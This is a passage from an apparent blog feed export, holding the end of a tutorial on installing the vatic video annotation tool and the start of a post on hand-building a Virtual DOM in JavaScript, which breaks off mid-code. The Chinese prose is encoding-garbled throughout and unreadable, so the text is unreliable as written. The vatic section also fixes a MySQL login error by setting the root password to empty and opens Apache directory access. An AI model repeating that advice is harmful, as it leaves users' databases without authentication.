&quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 47, in __init__self(parser.parse_args(args))File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 470, in __call__self.database(args)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 455, in databasedatabase.install()File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/database.py&quot;, line 45, in installBase.metadata.create_all(engine)File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/sql/schema.py&quot;, line 4287, in create_allFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2032, in _run_visitorFile &quot;/usr/lib/python2.7/contextlib.py&quot;, line 17, in __enter__return self.gen.next()File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2024, in _optional_conn_ctx_managerFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2226, in _contextual_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2266, in _wrap_pool_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 1536, in _handle_dbapi_exception_noconnectionFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/util/compat.py&quot;, line 383, in raise_from_causeFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2262, in _wrap_pool_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 354, in connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 751, in _checkoutFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 483, in checkoutFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/impl.py&quot;, line 138, in _do_getFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/util/langhelpers.py&quot;, line 68, in __exit__File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/impl.py&quot;, line 135, in _do_getFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 299, in _create_connectionFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 428, in __init__File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 630, in __connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/strategies.py&quot;, line 114, in connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/default.py&quot;, line 453, in connectFile &quot;build/bdist.linux-x86_64/egg/MySQLdb/__init__.py&quot;, line 81, in ConnectFile &quot;build/bdist.linux-x86_64/egg/MySQLdb/connections.py&quot;, line 193, in __init__sqlalchemy.exc.OperationalError: (_mysql_exceptions.OperationalError) (1045, &quot;Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)&quot;)(Background on this error at: http://sqlalche.me/e/e3q8)

é€™å€‹ error æ˜¯æºè‡ªæ–¼ mysql éœ€è¦ password æ‰èƒ½ accessï¼Œä½†ä½ å¯ä»¥ç”¨ä¸‹é¢çš„æŒ‡ä»¤å°‡ password è¨­æˆç©ºçš„ï¼š
use mysqlupdate user set authentication_string=password(&#x27;&#x27;) where user=&#x27;root&#x27;;flush privileges;

ä»¥ä¸‹æ˜¯åŸ·è¡Œç¯„ä¾‹ï¼š
mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set authentication_string=password(&#x27;&#x27;) where user=&#x27;root&#x27;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; quitBye

ç•¶ä½ å†åŸ·è¡Œä¸€æ¬¡ turkic setup --databaseï¼Œä½ å°±å¯ä»¥çœ‹åˆ°æˆåŠŸè¨­å®š database äº†ï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseInstalled new tables, if any.

Verificationæ¥ä¸‹ä¾†è¦åŸ·è¡Œ turkic status --verifyï¼ˆå¦‚æœä½ é‚„æ²’æœ‰è¦è·Ÿ MTurk ç¶å®šï¼Œä½ å¯ä»¥å¿½ç•¥ Amazon Mechanical Turk çš„ errorï¼‰ï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic status --verifyConfiguration:Sandbox: TrueDatabase: mysql://root@localhost/vaticLocalhost: http://localhost/Testing access to Amazon Mechanical Turk... OKTesting access to database server... OKTesting access to web server... ERROR! HTTP Error 403: ForbiddenOne or more tests FAILED!

Amazon çš„ MTurk æ˜¯ä¸€å€‹ crowd labeling çš„å¹³å°ï¼Œä½ å¯ä»¥å°‡ labeling çš„å·¥ä½œæ”¾åˆ°ç¶²ç«™ä¸Šï¼Œè®“ä¸–ç•Œä¸Šå„åœ°çš„äººä¾†ç‚ºä½ æ¨™è¨» dataï¼Œçœä¸‹è¨±å¤šæ™‚é–“ã€‚
å¯æ˜¯å³ä½¿å¿½ç•¥ MTurkï¼Œé‚„æ˜¯æœ‰ web server errorï¼Œé€™æ™‚å€™ä½ æœƒéœ€è¦æ”¹ä¸€ä¸‹ &#x2F;etc&#x2F;apache2&#x2F;apache2.confï¼ŒåŠ å…¥ä¸‹é¢å¹¾è¡Œï¼š
&lt;Directory /your_path_to_vatic/public&gt;Options Indexes FollowSymLinksAllowOverride AllRequire all granted&lt;/Directory

ç„¶å¾Œé‡æ–°å•Ÿå‹• apacheï¼ˆsudo apache2ctl gracefulï¼‰ï¼Œæ‡‰è©²å°±å¯ä»¥æˆåŠŸå•¦ï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic status --verifyConfiguration:Sandbox: TrueDatabase: mysql://root@localhost/vaticLocalhost: http://localhost/Testing access to Amazon Mechanical Turk... OKTesting access to database server... OKTesting access to web server... OKAll tests passed!

é€™æ™‚å€™åœ¨ç€è¦½å™¨è¼¸å…¥ localhost å°±å¯ä»¥çœ‹åˆ° vatic çš„ç•«é¢ã€‚
Frame extractionåœ¨æŠŠè‡ªå·±çš„ video frame extract å‡ºä¾†æ™‚ï¼Œè¨˜å¾—è¦åœ¨ vatic çš„ç›®éŒ„ä¸‹åŸ·è¡Œ turkicï¼Œä¸ç„¶æœƒå‡ºç¾ errorã€‚
Publish in offline modeæœ€å¾Œä¸€æ­¥å°±æ˜¯åœ¨è‡ªå·±é›»è…¦ä¸Š offline publish å‰›å‰›å¼„å¥½çš„ videoï¼š
turkic load identifier_off /home/icaros/Downloads/turkic_frames/my_video/ apple --offlineturkic publish --offline

ä½ æ‡‰è©²å¯ä»¥çœ‹åˆ°ä¸‹åˆ—çš„ outputï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic load identifier_off /home/icaros/Downloads/turkic_frames/my_video/ apple --offlineChecking integrity...Searching for last frame...Found 9320 frames.Binding labels and attributes...Creating symbolic link...Creating segments...Video loaded and ready for publication.icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic publish --offlinehttp://localhost?id=65&amp;hitId=offlinehttp://localhost?id=66&amp;hitId=offlinehttp://localhost?id=67&amp;hitId=offlinehttp://localhost?id=68&amp;hitId=offlinehttp://localhost?id=69&amp;hitId=offlinehttp://localhost?id=70&amp;hitId=offlinehttp://localhost?id=71&amp;hitId=offlinehttp://localhost?id=72&amp;hitId=offlinehttp://localhost?id=73&amp;hitId=offlinehttp://localhost?id=74&amp;hitId=offlinehttp://localhost?id=75&amp;hitId=offlinehttp://localhost?id=76&amp;hitId=offlinehttp://localhost?id=77&amp;hitId=offlinehttp://localhost?id=78&amp;hitId=offlinehttp://localhost?id=79&amp;hitId=offlinehttp://localhost?id=80&amp;hitId=offlinehttp://localhost?id=81&amp;hitId=offlinehttp://localhost?id=82&amp;hitId=offlinehttp://localhost?id=83&amp;hitId=offlinehttp://localhost?id=84&amp;hitId=offlinehttp://localhost?id=85&amp;hitId=offlinehttp://localhost?id=86&amp;hitId=offlinehttp://localhost?id=87&amp;hitId=offlinehttp://localhost?id=88&amp;hitId=offlinehttp://localhost?id=89&amp;hitId=offlinehttp://localhost?id=90&amp;hitId=offlinehttp://localhost?id=91&amp;hitId=offlinehttp://localhost?id=92&amp;hitId=offlinehttp://localhost?id=93&amp;hitId=offlinehttp://localhost?id=94&amp;hitId=offlinehttp://localhost?id=95&amp;hitId=offlinehttp://localhost?id=96&amp;hitId=offline

è¦ access ä½ çš„ taskï¼Œå»ç€è¦½å™¨è¼¸å…¥ä¸Šé¢ä»»æ„ä¸€å€‹ urlï¼Œä¾‹å¦‚ http://localhost/?id=86&amp;hitId=offline å³å¯ã€‚ ä½†å¦‚æœä½ çœ‹åˆ° server error, è«‹åœ¨ 000-default.conf æª”æ¡ˆä¸­åŠ ä¸Š Directory tag ä¸¦é‡å•Ÿ apacheï¼š
WSGIDaemonProcess www-dataWSGIProcessGroup www-data&lt;VirtualHost *:80&gt;ServerName localhostDocumentRoot /home/icaros/tool/vatic_home/vatic/publicWSGIScriptAlias /server /home/icaros/tool/vatic_home/vatic/server.pyCustomLog /var/log/apache2/access.log combined&lt;/VirtualHost&gt;&lt;Directory /home/icaros/tool/vatic_home/vatic&gt;&lt;Files server.py&gt;Require all granted&lt;/Files&gt;&lt;/Directory&gt;

é€™æ™‚å€™å†å»ç€è¦½å™¨è¼¸å…¥ http://localhost?id=86&amp;hitId=offlineï¼Œä½ å°±å¯ä»¥çœ‹åˆ° annotation çš„è¦–çª—äº†ï¼š

ç¸½çµä»Šå¤©æ•™å¤§å®¶è¦æ€éº¼å¾ç„¡åˆ°æœ‰ setup vatic é€™å€‹å¯ä»¥æ›´æ–¹ä¾¿æ¨™è¨» video ä¸­ bounding box çš„å·¥å…·ï¼Œå¸Œæœ›å°æœ‰ç›¸é—œéœ€æ±‚çš„è®€è€…æœ‰å¹«åŠ©ï¼
å»¶ä¼¸é–±è®€
BeaverDam: Video annotation tool for deep learning training labels
Tool for annotating and evaluating video object detection or tracking ?

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Deep Learning, Computer Vision, Video labeling</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾é ­æ‰“é€ ä¸€å€‹ç°¡å–®çš„ Virtual DOM</title>
    <url>/2019/02/04/vdom-from-scratch/</url>
    <content><![CDATA[å‰è¨€éå¹´é™¤èˆŠä½ˆæ–°ï¼Œå‰›å¥½è¶é€™å€‹æ©Ÿæœƒä¾†è¤‡ç¿’ä¸€ä¸‹å·²ç¶“æ˜¯è€è§€å¿µçš„ Virtual DOMã€‚å¾ˆå¤šäººåœ¨è¬›åˆ° React çš„æ™‚å€™éƒ½ä¸€å®šæœƒæåˆ° Virtual DOMï¼Œè€Œå•åˆ° Virtual DOM çš„å¥½è™•æ™‚ï¼Œå°±æœƒèªªåˆ°å¯¦éš› DOM çš„æ“ä½œæˆæœ¬å¾ˆè²´ï¼Œæ‰€ä»¥é€é Virtual DOM å¯ä»¥é™ä½æˆæœ¬ã€‚
ä½ åœ¨é™¤å¤•é¤æ¡Œä¸Šé€™æ¨£è¬›å¯èƒ½æ²’å•é¡Œï¼Œé¢è©¦åªè¬›é€™æ¨£æ‡‰è©²ä¸å¤ªå¥½ã€‚
ç•¢ç«Ÿä½ æœ€å¾Œé‚„æ˜¯æœƒæ“ä½œå¯¦é«” DOM å•Šï¼Œé€™æ¨£èªªæ˜å¤ªç°¡åŒ–äº†ã€‚
Virtual DOM çš„ç”±ä¾†å¯ä»¥å¾ MVC å’Œ MVVM çš„æ¶æ§‹è¿½æº¯èµ·ï¼Œä¸»è¦éƒ½æ˜¯ç‚ºäº†è§£æ±ºå‰ç«¯é é¢å‘ˆç¾ã€è³‡æ–™æ›´å‹•ã€ä½¿ç”¨è€…æ“ä½œé€™ä¸‰ç¨®ç‹€æ…‹äº¤äº’ä½œç”¨ç”¢ç”Ÿçš„è¤‡é›œæ€§ï¼ŒMVC æä¾›äº†ä¸€å€‹è§£æ³•ï¼ŒMVVM æå‡ºçš„ View Model æœ‰äº†å„ªåŒ–çš„æ–¹æ¡ˆï¼Œé‚„æœ‰ data èˆ‡ view é›™å‘ç¶å®šçš„æ–¹å¼ç­‰ç­‰ï¼Œè€Œ React æå‡ºäº†å¦ä¸€ç¨®æ€è·¯ï¼Œä½†é‚£ä¸æ˜¯æˆ‘ä»Šå¤©çš„é‡é»ï¼Œæœ‰èˆˆè¶£ä¸”é‚„ä¸çŸ¥é“é€™äº›åè©æ˜¯ä»€éº¼çš„è®€è€…å¯ä»¥å»æœå°‹çœ‹çœ‹ï¼Œæœ‰å¾ˆå¤šæ–‡ç« åœ¨èªªæ˜é€™äº›è³‡è¨Šèˆ‡æ­·å²ã€‚
React çš„ Virtual DOM æ˜¯å› æ‡‰å…¶æ•¸æ“šèˆ‡ UI æ›´æ–°ç¹ªè£½çš„ç‰¹æ®Šæ€è·¯è€Œæå‡ºçš„æ•ˆèƒ½è§£æ±ºæ–¹æ¡ˆã€‚
React å¸Œæœ›åœ¨è³‡æ–™æ›´æ–°æ™‚ï¼Œèƒ½å¤ ç›´æ¥é‡æ–°æ¸²æŸ“é é¢ï¼Œä¸ç”¨ä¸»å‹•å»æ¢ç©¶æ˜¯æ•¸æ“šçš„å“ªéƒ¨ä»½ç™¼ç”Ÿè®ŠåŒ–ï¼Œè¦å°æ‡‰å»æ›´æ–°é é¢å“ªä¸€éƒ¨åˆ†çš„ DOMã€‚ä½†é é¢é‡æ–°æ¸²æŸ“çš„æˆæœ¬å¯æ˜¯æ›´é«˜ï¼Œæ‰€ä»¥æ‰éœ€è¦ Virtual DOM ä½œç‚ºç·©è¡ï¼Œé€éè³‡æ–™æ›´æ–°å¾Œï¼Œé‡æ–°ç¹ªè£½ Virtual DOMï¼Œèˆ‡å¯¦é«” DOM é€²è¡Œ Diffï¼Œæœ€å¾Œå†æŠŠå·®ç•°éƒ¨åˆ† Patch ä¸Šå»ï¼Œé€™ä¸åƒ…ä¿®æ­£äº†é‡æ–°æ¸²æŸ“çš„æˆæœ¬å•é¡Œï¼Œä¹Ÿé™ä½äº† data èˆ‡ view äº¤äº’æ›´æ–°çš„è¤‡é›œåº¦ï¼Œæé«˜äº† developer çš„é–‹ç™¼é«”é©—ã€‚
èªªäº†é€™éº¼å¤šï¼Œå…¶å¯¦ä»Šå¤©å°±åªæ˜¯å–®ç´”æƒ³è‡ªå·±æ‰‹åˆ»ä¸€å€‹ Virtual DOM ä¾†ç†è§£ä¸€ä¸‹è©²æ€éº¼å¯¦ç¾é€™æ¨£çš„åŠŸèƒ½ï¼Œç•¢ç«ŸçŸ¥é“äº†æ¦‚å¿µï¼Œç¸½è¦ºå¾—æ‰‹åˆ»æ‡‰è©²ä¸é›£ã€‚æ‰‹åˆ» Virtual DOM å…¶å¯¦ä¹Ÿæ²’ä»€éº¼å¤ªå¤§æ„ç¾©ï¼Œä½†å¾ˆå¤šæ™‚å€™å°±æ˜¯ for funï¼Œç„¶å¾Œåšå€‹è¨˜éŒ„ã€‚
ä¸»è¦åƒè€ƒè‡³ @ycmjason çš„ talk èˆ‡ blogï¼Œéå¸¸æ¨è–¦æ¬£è³ï¼Œè¬›è€…çš„ç†±æƒ…å®Œå…¨æ©è“‹æ‰éŸ³è¨Šä¸ä½³çš„ç¼ºé»ï¼Œåˆå¾ˆæ¸…æ¥šåœ°ä»‹ç´¹äº† VDOM å¯¦ä½œã€‚
æ‰€ä»¥ï¼ŒVirtual DOM åˆ°åº•é•·ä»€éº¼æ¨£å­ï¼ŸVirtual DOM å°±åªæ˜¯å€‹ javascript plain objectï¼Œä¸¦ä¸”æ¨¡ä»¿ Actual DOM çš„çµæ§‹ï¼ˆä½†ç•¶ç„¶ç°¡åŒ–å¾ˆå¤šï¼‰ï¼š
const vElement = &#123;  tagName: &#x27;div&#x27;,  attrs: &#123;    id: &#x27;v-element&#x27;,  &#125;,  children: []&#125;;

ä¸€å€‹åŸºæœ¬çš„ VDOMï¼Œæˆ‘å€‘åªéœ€è¦å…ƒç´ åç¨±ï¼ˆtagNameï¼‰ã€å…ƒç´ å±¬æ€§ï¼ˆattrsï¼‰èˆ‡å…¶ Children listï¼ˆæ—¢ç„¶æ˜¯è™›æ“¬ DOMï¼Œé€™å€‹ plain object è£¡é¢çš„å±¬æ€§å…¶å¯¦éš¨ä¾¿ä½ å–åï¼Œåªè¦å°æ‡‰å¾—åˆ°å¯¦éš› DOM å³å¯ï¼‰ã€‚
æ ¹æ“šé€™å€‹æƒ³æ³•ï¼Œæˆ‘å€‘å¯ä»¥æ¨¡ä»¿ç¾å­˜çš„ VDOM libï¼Œæä¾›ä¸€å€‹ createElement çš„ functionï¼š
createElement.jsexport default (tagName, &#123; attrs = &#123;&#125;, children = [] &#125;) =&gt; &#123;  const vElement = Object.create(null);  Object.assign(vElement, &#123;    tagName,    attrs,    children,  &#125;);  return vElement;&#125;;


Note: åˆ©ç”¨ Object.create(null) èˆ‡ Object.assign çš„æ–¹å¼ç”¢ç”Ÿç‰©ä»¶ï¼Œå¯ä»¥é¿å…ç›´æ¥æ¡ç”¨ Object literals çš„æ–¹å¼æœƒç¹¼æ‰¿åˆ° object prototype çš„å±¬æ€§ã€‚

ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
main.jsimport createElement from &#x27;./createElement&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);console.log(vRootApp);

çµæœï¼š

å¾ Virtual DOM åˆ° Real DOMæœ‰äº† Virtual DOMï¼Œæˆ‘å€‘é‚„éœ€è¦ä¸€å€‹ render å‡½æ•¸ä¾†å°‡å…¶ç¹ªè£½åˆ°é é¢ä¸Šã€‚æ–¹æ³•å¾ˆç°¡å–®ï¼Œæˆ‘å€‘åªéœ€è¦ document.createElementã€setAttribute èˆ‡ appendChild ä¸‰å€‹ web api å³å¯å®Œæˆï¼š
render.jsconst renderElem = (&#123; tagName, attrs, children &#125;) =&gt; &#123;  const elem = document.createElement(tagName);  for (const [k, v] of Object.entries(attrs)) &#123;    elem.setAttribute(k, v);  &#125;  for (const child of children) &#123;    elem.appendChild(renderElem(child));  &#125;  return elem;&#125;;export default renderElem;

æ ¹æ“š tagName ä½¿ç”¨ document.createElement ä¾†å»ºç«‹å¯¦éš›çš„ DOM ç‰©ä»¶ï¼Œä¸¦ä¸”å°‡ attrs ä¸€å€‹ä¸€å€‹ setAttribute åˆ°å¯¦éš›çš„ DOM å…ƒç´ ä¸Šï¼›æœ€å¾Œå†å°‡ children éè¿´ä¸Ÿå…¥ renderElem å‡½æ•¸ä¸­ï¼Œå°‡æ‰€æœ‰å°å­©çš„å¯¦éš› DOM object éƒ½å»ºç«‹å¥½ä¸¦ appendChild åˆ°ä¸Šå±¤çš„å¯¦éš› DOM ç‰©ä»¶ä¸Šï¼Œæœ€å¾Œå°‡å®Œæ•´çš„ real DOM object å›å‚³å‡ºå»ã€‚
ä»¥æ¦‚å¿µä¾†èªªåŸºæœ¬ä¸Šé€™æ¨£å°±å®Œæˆäº†ï¼Œä½†å¯ä»¥è®“ä»–åœ¨å®Œæ•´ä¸€é»ï¼Œæä¾› textNode çš„æ”¯æ´ï¼Œåˆ©ç”¨ document.createTextNode ä¾†ç”¢ç”Ÿç´” string çš„å…ƒç´ ï¼Œç¨å¾®ä¿®æ”¹ render.js å¦‚ä¸‹ï¼š
render.jsconst renderElem = (&#123; tagName, attrs, children &#125;) =&gt; &#123;  const elem = document.createElement(tagName);  for (const [k, v] of Object.entries(attrs)) &#123;    elem.setAttribute(k, v);  &#125;  for (const child of children) &#123;    elem.appendChild(render(child));  &#125;  return elem;&#125;;const render = (vNode) =&gt; &#123;  if (typeof vNode === &#x27;string&#x27;) &#123;    return document.createTextNode(vNode);  &#125;  return renderElem(vNode);&#125;;export default render;

å¾ render å‡½æ•¸å›å‚³çš„åŸºæœ¬ä¸Šå°±æœƒæ˜¯ä¸€é¡†å®Œæ•´çš„ Virtual DOM Tree äº†ï¼Œèˆ‰å€‹ä¾‹å­ä¾†çœ‹ï¼š
import createElement from &#x27;./createElement&#x27;;import render from &#x27;./render&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    &#x27;Hello VDOM&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);const rootApp = render(vRootApp);

çµæœå¦‚ä¸‹ï¼ŒVirtual DOM å°±æ˜¯å€‹ Javascript plain objectï¼Œè€Œç¶“ç”± render å‡½æ•¸å›å‚³çš„å³æ˜¯åŒ…å«å¯¦éš› DOM å±¬æ€§çš„ Real DOMï¼š

æ›åˆ°é é¢ä¸Šå§ï¼é€é render æˆ‘å€‘æœ‰äº†å¯¦é«” DOMï¼Œä½†é€™æ¨£é‚„æ²’è¾¦æ³•åœ¨é é¢ä¸Šé¡¯ç¤ºï¼Œéœ€è¦æœ‰å€‹é¡ä¼¼ ReactDOM.render çš„æ–¹æ³•ä¾†å¹«åŠ©æˆ‘å€‘å¯¦ç¾ï¼š
mount.jsexport default (element, targetNode) =&gt; &#123;  targetNode.appendChild(element);&#125;;

main.jsimport createElement from &#x27;./createElement&#x27;;import render from &#x27;./render&#x27;;import mount from &#x27;./mount&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    &#x27;Hello VDOM&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);const rootApp = render(vRootApp);mount(rootApp, document.getElementById(&#x27;rootApp&#x27;));

å¾ˆç°¡å–®ï¼Œå°±æŠŠæˆ‘å€‘ç”¢ç”Ÿçš„ Real DOM appendChild åˆ° targetNode ä¸‹å°±å¥½ã€‚
æˆ–æ˜¯ä¹Ÿèƒ½ç”¨ targetNode.replaceWith(element); çš„æ–¹å¼ç›´æ¥å–ä»£æ‰ targetNodeã€‚ï¼ˆä¸éè¦æ³¨æ„ä¸€ä¸‹ IE æ˜¯ç„¡æ³•ä½¿ç”¨çš„å–”ï¼ï¼‰

Diff Virtual DOM - ReconciliationçŸ¥é“æ€éº¼ç”¢ç”Ÿ Virtual DOM ä¸¦ç¹ªè£½åˆ°é é¢ä¸Šå¾Œï¼Œä¹Ÿæ˜¯æ™‚å€™é€²å…¥é‡é ­æˆ²äº†ï¼
å¦‚å‰è¨€æ‰€èªªï¼ŒVirtual DOM ä½œç‚ºæˆ‘å€‘æ“ä½œ Real DOM çš„ä¸€å±¤ç·©è¡ï¼Œæˆ‘å€‘æ¯”è¼ƒç¶“éç‹€æ…‹è®ŠåŒ–å¾Œç”¢ç”Ÿçš„æ–°èˆŠ Virtual DOM ä¾†æ‰¾å‡ºå¯¦éš›éœ€è¦æ›´æ–°çš„ Real DOM ä½ç½®ï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œå„˜ç®¡æ¯æ¬¡éƒ½é‡æ–° Renderï¼Œå¯¦éš›æ›´æ–°çš„ DOM ä¹Ÿä¸æœƒæ˜¯å…¨éƒ¨ï¼Œå¯ä»¥å¤§å¹…æ”¹å–„ç›´æ¥é‡æ–°æ¸²æŸ“çš„æ•ˆèƒ½å•é¡Œã€‚
è€Œ tree diff çš„æ¼”ç®—æ³•å…¶å¯¦å¾ˆè¤‡é›œï¼Œå¦‚æœç”¨ Tree Edit Distance çš„æ–¹å¼éè¿´æª¢æŸ¥æ¯å€‹ç¯€é»ï¼Œè¤‡é›œåº¦å°‡å¯é”åˆ° O(n^3)ï¼Œæ˜¯éå¸¸é©šäººçš„æ•¸å­—ï¼Œå¹¾ä¹ç„¡æ³•åœ¨çŸ­æ™‚é–“è™•ç†å®Œï¼Œå› æ­¤ React æ‰€æå‡ºçš„ reconciliation åˆ¶å®šäº†ä¸€äº›ç­–ç•¥ï¼Œä¾†å°‡è¤‡é›œåº¦å¾ O(n^3) é™è‡³ O(n)ã€‚React å®˜æ–¹æ–‡æª”å…¶å¯¦èªªæ˜å¾—å¾ˆæ¸…æ¥šã€‚
ä¸»è¦æœ‰å…©å€‹å‡è¨­ï¼š

åªéœ€è¦æ¯”è¼ƒåŒä¸€å±¤çš„ç¯€é»ï¼ŒåŒä¸€å±¤å…§çš„å…ƒç´ è‹¥æ“æœ‰ä¸åŒçš„ typeï¼Œå¾€ä¸‹é•·å‡ºçš„æ¨¹å°±æœƒä¸åŒã€‚
åŒæ¨£ type çš„å…ƒä»¶ï¼Œé–‹ç™¼è€…å¯ä»¥ä½¿ç”¨ key é€™å€‹ props ä¾†æ±ºå®šå…¶å­æ¨¹æ˜¯å¦éœ€è¦é‡æ–° renderã€‚

å¦‚å‡è¨­ä¸€æåŠï¼Œæˆ‘å€‘åªæ¯”è¼ƒæ–°èˆŠå…©æ£µ Virtual DOM Tree ä¸­ï¼ŒåŒå€‹çˆ¶ç¯€é»ä¸‹çš„æ‰€æœ‰å­ç¯€é»ï¼Œè‹¥ç™¼ç¾æŸå€‹ç¯€é»ä¸å­˜åœ¨äº†ï¼Œé‚£å°±æ•´å€‹å­æ¨¹éƒ½æœƒåˆªé™¤ä¸å»é€²ä¸€æ­¥æ¯”è¼ƒã€‚

é€™æ¨£åšçš„æ„æ€å°±æ˜¯èªªï¼Œå¦‚æœä»Šå¤©ç™¼ç”Ÿäº†ä¸€äº›è·¨å±¤ç´šçš„æ“ä½œï¼Œåƒæ˜¯æ•´é¡†å­æ¨¹è¢«æ¬ç§»åˆ°å¦ä¸€å€‹ç¯€é»ä¸Šï¼Œå° React ä¾†èªªï¼Œæœƒæ˜¯åˆªæ‰åŸæœ‰çš„å­æ¨¹ï¼Œç„¶å¾Œé‡æ–°åœ¨æ–°çš„ä½ç½®å»ºç«‹ä¸€æ¨¡ä¸€æ¨£çš„å­æ¨¹å‡ºä¾†ï¼š


Note: å¯¦éš›ä¸Š React åœ¨é€™å…©å€‹å‡è¨­ä¸‹ï¼Œé‚„åšäº†è¨±å¤šæ›´ç´°ç¯€çš„äº‹æƒ…ï¼ˆcomponent diffã€element diffï¼‰ï¼Œå¯ä»¥å…ˆå»åƒè€ƒé€™ç¯‡å¾ˆä¹…ä¹‹å‰çš„æ–‡ç« ï¼Œå†å»é–±è®€ React fiber çš„ä»‹ç´¹ã€‚

åŸºæ–¼é€™å…©å€‹å‡è¨­æˆ‘å€‘å¯ä»¥é–‹å§‹å¯¦ä½œç°¡å–®ç‰ˆçš„ Virtual DOM Diffing æ¼”ç®—æ³•ï¼ŒåŸºæœ¬ä¸Šæœ‰å››å€‹ cases è™•ç†ï¼š

newTreeRoot ç‚º undefinedï¼Œä¹Ÿå°±æ˜¯æŸå€‹ç¯€é»è¢«åˆªé™¤äº†ã€‚
å…©å€‹ Node éƒ½æ˜¯ç´”å­—ä¸²ã€‚
ä¸€å€‹ Node ç‚ºç´”å­—ä¸²ï¼Œä¸€å€‹ Node ç‚º Virtual Elementã€‚
æ–°èˆŠ TreeRoot çš„ TagName ä¸åŒã€‚

æ ¹æ“šé€™å››ç¨® cases æˆ‘å€‘å€‹åˆ¥è™•ç†ï¼Œä¸¦ä¸”å›å‚³ä¸€å€‹ patch å‡½æ•¸ï¼Œä¾›ä¹‹å¾Œä¾†å°‡ diff å®Œçš„çµæœ attach åˆ° Real DOM ä¸Š ï¼ˆNote: r é–‹é ­çš„éƒ½ä»£è¡¨ Real DOMï¼Œv é–‹é ­ç‚º Virtual DOMï¼‰ï¼š
diff.jsimport render from &#x27;./render&#x27;;const diff = (oldVTreeRoot, newVTreeRoot) =&gt; &#123;  // å‡è¨­ oldVTreeRoot ä¸€å®šéƒ½å­˜åœ¨ï¼Œåªæœ‰ newVTreeRoot æœ‰æ©Ÿæœƒè¢«åˆªé™¤ï¼Œä¹Ÿå°±æ˜¯ undefined  if (newVTreeRoot === undefined) &#123;    // å›å‚³ patch å‡½æ•¸ï¼Œæœƒæ¥æ”¶ Real DOMï¼Œé€™é‚Š r é–‹é ­çš„éƒ½ä»£è¡¨ Real DOMï¼Œv é–‹é ­ç‚º Virtual DOM    return rNode =&gt; &#123;      // å› ç‚ºæ–°çš„ Virtual DOM Tree æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å›å‚³çš„ Patch å‡½å¼å°±æ˜¯ç›´æ¥æŠŠ Real DOM åˆªé™¤ã€‚      rNode.remove();      return undefined;    &#125;  &#125;  if (typeof oldVTreeRoot === &#x27;string&#x27; ||    typeof newVTreeRoot === &#x27;string&#x27;) &#123;    if (oldVTreeRoot !== newVTreeRoot) &#123;      // é€™é‚ŠåŒ…å«å…©ç¨® casesï¼š      // Case 1ï¼šæ–°èˆŠ Virtual DOM Tree å…¶ä¸­ä¸€å€‹ç‚º stringï¼Œä¸€å€‹ç‚º 